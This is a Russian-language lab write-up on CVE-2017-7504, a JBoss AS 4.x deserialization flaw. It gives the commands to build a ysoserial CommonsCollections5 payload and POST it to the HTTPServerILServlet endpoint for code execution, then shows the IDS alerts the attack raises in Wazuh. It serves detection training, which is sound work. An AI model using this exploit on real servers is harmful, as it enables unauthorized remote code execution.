# CVE-2017-7504

CVE-2017-7504 является уязвимостью десериализации, уязвимыми являются JBoss AS 4.x и предыдущие версии. Принцип уязвимости. В JBoss AS 4.x и более ранних версиях файл HTTPServerILServlet.java уровня вызова JServer через HTTP в процессе реализации JBossMQ имеет уязвимость десериализации.

Злоумышленник может использовать эту уязвимость для выполнения произвольного кода со специальными сериализованными данными.

### Эксплуатация уязвимости

Для запуска уязвимой среды выполните команду:

```
docker compose up -d
```

Чтобы сгенерировать полезную нагрузку, нужно скачать [ysoserial](https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar) и выполнить данную команду

```
java -jar ysoserial-all.jar CommonsCollections5 "touch /tmp/success" > 1.ser
```

Если при генерации пэйлоада возникает подобная ошибка, нужно откатить версию Java

> Для генерации подойдет 11 версия&#x20;
>
> Чтобы откатить java к 11 версии, нужно найти пакет с помощью команды sudo apt search jdk и скачать его, а затем выполнить команду sudo update-alternatives --config java и sudo update-alternatives --config javac и выбрать 11 версию
>
>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

После этого отправляем содержимое файла как тело POST-запроса

```
curl http://ваш-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser
```

Результатом эксплуатации является создание файла /tmp/success

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости.

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
